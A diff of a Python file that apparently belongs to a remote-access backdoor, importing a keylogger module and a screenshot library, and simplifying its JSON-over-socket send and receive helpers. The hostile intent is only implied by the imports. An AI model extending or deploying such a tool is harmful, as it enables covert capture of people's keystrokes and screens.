@@ -20,46 +20,19 @@ from mss import mss
 import keylogger
 
 
-def reliable_recv(target):
+def reliable_send(s, data):
+    jsondata = json.dumps(data)
+    s.send(jsondata.encode())
+
+
+def reliable_recv(s):
     data = ''
     while True:
         try:
-            chunk = target.recv(1024).decode().rstrip()
-            print(f"[DEBUG] Received chunk: {chunk}")
-            data += chunk
-            result = json.loads(data)
-            print(f"[DEBUG] Parsed JSON successfully: {result}")
-            return result
+            data = data + s.recv(1024).decode().rstrip()
+            return json.loads(data)
         except ValueError:
-            print("[DEBUG] Incomplete JSON data, waiting for more...")
             continue
-        except socket.error as e:
-            print(f"[ERROR] Socket error during recv: {e}")
-            return None
-        except Exception as e:
-            print(f"[ERROR] Unexpected error in reliable_recv: {e}")
-            return None
-
-
-def reliable_send(target, data):
-    try:
-        jsondata = json.dumps(data)
-        print(f"[DEBUG] Sending JSON data: {jsondata}")
-    except Exception as e:
-        print(f"[ERROR] Failed to serialize data to JSON: {e}")
-        return
-
-    while True:
-        try:
-            target.send(jsondata.encode())
-            print("[DEBUG] Data sent successfully.")
-            break
-        except BrokenPipeError:
-            print("[ERROR] BrokenPipeError: Connection to target lost.")
-            break
-        except Exception as e:
-            print(f"[ERROR] Unexpected error in reliable_send: {e}")
-            break
 
 
 
